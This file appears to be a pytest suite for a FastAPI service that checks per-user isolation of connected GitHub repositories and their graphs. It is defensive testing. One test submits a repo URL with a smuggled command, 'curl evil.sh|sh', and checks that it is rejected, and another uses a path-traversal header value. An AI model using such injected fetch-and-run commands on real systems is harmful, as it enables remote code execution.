import pytest
from fastapi.testclient import TestClient

from rhizo.graph.client import GraphClient, repo_prefix
from rhizo.main import app
from rhizo.repos import github, registry
from rhizo.repos.github import RepoInfo, RepoRef
from rhizo.repos.registry import Repo
from tests.conftest import TEST_USER, client_for, make_token

INTRUDER = "user-999"


def _as(user: str) -> TestClient:
    return TestClient(app, headers={"Authorization": f"Bearer {make_token(user)}"})


@pytest.fixture
def owned(tiny_graph: GraphClient, test_repo: Repo) -> Repo:
    return test_repo


def test_graph_names_are_derived_from_owner_and_repo(owned: Repo) -> None:
    assert repo_prefix(owned.user_id, owned.id) == f"r_{TEST_USER}_{owned.id}"
    assert GraphClient(repo_prefix(owned.user_id, owned.id)).memory_name == f"r_{TEST_USER}_{owned.id}_memory"


@pytest.mark.parametrize(
    ("method", "path"),
    [("GET", "/api/repos/{id}"), ("POST", "/api/repos/{id}/sync"), ("DELETE", "/api/repos/{id}")],
)
def test_another_users_repo_is_not_found(owned: Repo, method: str, path: str) -> None:
    res = _as(INTRUDER).request(method, path.format(id=owned.id))
    assert (res.status_code, res.json()["error"]["code"]) == (404, "NOT_FOUND")
    assert registry.get(TEST_USER, owned.id) is not None


@pytest.mark.parametrize(
    ("method", "path", "body"),
    [
        ("GET", "/api/graph", None),
        ("GET", "/api/services", None),
        ("GET", "/api/incidents", None),
        ("POST", "/api/impact/blast-radius", {"service": "C"}),
        ("POST", "/api/agent/ask", {"question": "What breaks if C fails?"}),
    ],
)
def test_another_users_repo_id_cannot_reach_its_graph(
    owned: Repo, method: str, path: str, body: object
) -> None:
    intruder = client_for(owned, user=INTRUDER)
    res = intruder.request(method, path, json=body)
    assert (res.status_code, res.json()["error"]["code"]) == (404, "NOT_FOUND")
    assert client_for(owned).request(method, path, json=body).status_code == 200


def test_lists_only_your_own_repos(owned: Repo) -> None:
    registry.create(INTRUDER, "evil", "corp")
    mine = _as(TEST_USER).get("/api/repos").json()["data"]
    assert [r["id"] for r in mine if not r["is_demo"]] == [owned.id]


@pytest.mark.parametrize("header", ["", "not-a-repo-id", "0123456789ab", "../../etc", "a" * 200])
def test_missing_or_bogus_repo_header(owned: Repo, header: str) -> None:
    res = _as(TEST_USER).get("/api/graph", headers={"X-Repo-Id": header} if header else {})
    assert res.status_code in (400, 404)


def test_connect_creates_an_owned_queued_repo_and_starts_a_job(
    monkeypatch: pytest.MonkeyPatch, _isolated: list[str]
) -> None:
    monkeypatch.setattr(github, "repo_info", lambda ref: RepoInfo(ref.owner, ref.name, 10, "main"))
    res = _as(TEST_USER).post("/api/repos", json={"url": "https://github.com/acme/shop"})
    assert res.status_code == 201
    repo = res.json()["data"]
    assert (repo["full_name"], repo["status"], repo["progress"]) == ("acme/shop", "queued", 0)
    assert _isolated == [repo["id"]]
    again = _as(TEST_USER).post("/api/repos", json={"url": "https://github.com/acme/shop"})
    assert (again.status_code, again.json()["error"]["code"]) == (409, "CONFLICT")
    assert _as(INTRUDER).post("/api/repos", json={"url": "https://github.com/acme/shop"}).status_code == 201


def test_malicious_url_never_reaches_github(monkeypatch: pytest.MonkeyPatch) -> None:
    def must_not_be_called(ref: RepoRef) -> RepoInfo:
        raise AssertionError("GitHub was called for an invalid URL")

    monkeypatch.setattr(github, "repo_info", must_not_be_called)
    res = _as(TEST_USER).post("/api/repos", json={"url": "https://github.com/a/b;curl evil.sh|sh"})
    assert res.status_code == 400


def test_delete_drops_both_graphs(owned: Repo, tiny_graph: GraphClient) -> None:
    db = tiny_graph._connect()
    tiny_graph.memory().query("CREATE (:Incident {id: 'INC-1'})")
    assert {tiny_graph.topology_name, tiny_graph.memory_name} <= set(db.list_graphs())
    assert _as(TEST_USER).delete(f"/api/repos/{owned.id}").status_code == 200
    assert not {tiny_graph.topology_name, tiny_graph.memory_name} & set(db.list_graphs())
    assert registry.get(TEST_USER, owned.id) is None


def test_sync_is_refused_while_one_is_running(owned: Repo) -> None:
    registry.update(owned.id, status="ingesting")
    res = _as(TEST_USER).post(f"/api/repos/{owned.id}/sync")
    assert (res.status_code, res.json()["error"]["code"]) == (409, "CONFLICT")
    assert _as(TEST_USER).delete(f"/api/repos/{owned.id}").status_code == 409
